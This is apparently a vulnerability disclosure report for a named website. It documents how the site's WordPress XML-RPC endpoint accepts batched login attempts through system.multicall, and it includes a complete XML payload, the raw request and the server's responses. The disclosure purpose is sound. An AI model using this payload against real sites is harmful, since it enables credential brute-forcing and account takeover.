# Proof of Concept — VULN-002

**Target:** omgnepal.com
**Type:** XMLRPC system.multicall Credential Brute Force
**Endpoint:** https://omgnepal.com/xmlrpc.php
**Tested on:** March 2026
**Researcher:** Vibhor Prasad (stack-guardian)

---

## Environment

- Tool: Burp Suite, curl
- OS: Arch Linux
- Authenticated: No
- Account type: Unauthenticated

---

## Preconditions

None. The endpoint is publicly accessible without authentication.

---

## Steps to Reproduce

1. Send a POST request to `https://omgnepal.com/xmlrpc.php` with `Content-Type: text/xml`.
2. Use the payload below containing multiple nested `wp.getUsersBlogs` calls inside `system.multicall`.
3. Observe that the server processes all credential attempts in a single HTTP request.

---

## Payload

```xml
<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>pass1</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>pass2</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param></params>
</methodCall>
```

---

## HTTP Request

```
POST /xmlrpc.php HTTP/2
Host: omgnepal.com
Content-Type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36

[payload above]
```

---

## HTTP Response

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
<params><param><value><array><data>
<value><struct>
<member><name>faultCode</name><value><int>403</int></value></member>
<member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
<value><struct>
<member><name>faultCode</name><value><int>403</int></value></member>
<member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
</data></array></value></param></params>
</methodResponse>
```

---

## Expected Behavior

The server should reject batched authentication attempts or disable the `system.multicall` method entirely to prevent credential stuffing at scale.

---

## Actual Behavior

The server processes all bundled authentication attempts and returns individual fault responses for each, confirming the endpoint accepts batched credential testing with no rate limiting applied per attempt.

---

## Evidence

HTTP response confirms the server processed two separate authentication attempts in a single request, each returning a distinct `faultCode: 403` with `Incorrect username or password.` This confirms the multicall method is active and functional.
